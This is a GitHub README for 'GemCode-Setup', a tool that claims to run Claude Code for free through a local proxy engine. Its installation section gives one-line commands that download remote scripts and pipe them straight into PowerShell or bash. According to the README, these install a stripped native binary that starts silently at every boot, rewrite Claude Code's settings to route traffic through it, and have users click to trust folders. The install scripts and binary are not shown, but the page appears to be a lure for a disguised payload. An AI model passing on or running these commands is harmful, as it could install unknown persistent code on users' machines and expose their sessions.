# 🚀 GemCode-Setup

[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-blue?style=for-the-badge)](https://github.com/RiadDeveloper/GemCode-Setup)
[![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](LICENSE)
[![Cost](https://img.shields.io/badge/Cost-100%25%20Free-brightgreen?style=for-the-badge)](https://github.com/RiadDeveloper/GemCode-Setup)

> **Run official Claude Code CLI completely free with Zero Subscription Fees!**  
> Powered by the high-performance, native compiled **GemCode Engine**.

---

## ⚡ 1-Click Fast Installation

Choose your Operating System and run the one-line command in your terminal:

### 🪟 Windows (PowerShell)
Open **PowerShell** (no Administrator required) and run:

```powershell
irm https://raw.githubusercontent.com/RiadDeveloper/GemCode-Setup/main/install.ps1 | iex
```

---

### 🍎 macOS & 🐧 Linux (Terminal)
Open your **Terminal** and run:

```bash
curl -fsSL https://raw.githubusercontent.com/RiadDeveloper/GemCode-Setup/main/install.sh | bash
```

---

## 🎯 What Happens Automatically?

The installer takes care of **everything** in under 5 seconds:

1. 📥 **Deploys the Pre-Compiled Native Binary**: Single-file, stripped machine binary with zero dependencies (no Python or node required).
2. 🔄 **Configures Auto-Start on Boot**:
   - **Windows**: Silent background service via Startup Registry.
   - **macOS**: `launchd` LaunchAgent daemon.
   - **Linux**: `systemd` user service.
3. ⚙️ **Configures Claude Code Settings**: Pre-configures `~/.claude/settings.json` with seamless local API routing.
4. 🛠️ **Installs Claude Code**: If you don't already have Claude Code installed, it installs it for you.
5. 🚀 **Starts Immediately**: Everything runs silently in the background.

---

## 💻 How to Use

Once installed, just open **any terminal** and start coding:

```bash
claude
```

*(On your first launch in any folder, Claude Code will ask: `Is this a project you created or one you trust?` — select **`Yes, I trust this folder`** and press Enter).*

---

## 🧠 Model Routing & Intelligence

GemCode seamlessly translates Claude requests into high-power reasoning:

| Claude Model in Request | Routed Model | Features |
|---|---|---|
| `claude-3-5-sonnet*` (Default) | Extended Thinking Mode | Deep reasoning, 20,000+ chars output |
| `claude-3-7-sonnet*` | Flash Hybrid | Ultra-fast hybrid speed & intelligence |
| `claude-3-5-haiku*` | Flash Speed | Instant lightweight answers |
| `claude-3-opus*` | Pro Routing | Complex algorithms & architecture |

---

## 🔒 Security & Privacy

- **Native Binary**: The engine is compiled directly into machine code (`0101`). All debug information and symbols are stripped.
- **Local Proxying**: All communication between Claude Code and GemCode happens strictly over your local machine (`http://localhost:8081`).
- **No API Keys Required**: Zero cost, zero credit cards, zero subscription fees.

---

## ❓ FAQ & Troubleshooting

<details>
<summary><b>Does it work after restarting the computer?</b></summary>
Yes! GemCode is configured as a background startup service. It turns on silently whenever your system boots.
</details>

<details>
<summary><b>Can I change the default model?</b></summary>
Yes! Open your <code>~/.claude/settings.json</code> and set <code>ANTHROPIC_MODEL</code> to any preferred model name (e.g. <code>claude-3-5-sonnet-20241022</code>).
</details>

<details>
<summary><b>How do I check if the engine is running?</b></summary>
Visit <a href="http://localhost:8081/">http://localhost:8081/</a> in your browser or run:
<code>curl http://localhost:8081/</code> — It will return <code>{"status":"ok", "app":"GemCode"}</code>.
</details>

---

## 👨‍💻 Maintainer

Developed & maintained with ❤️ by [**Riad Developer**](https://github.com/RiadDeveloper).
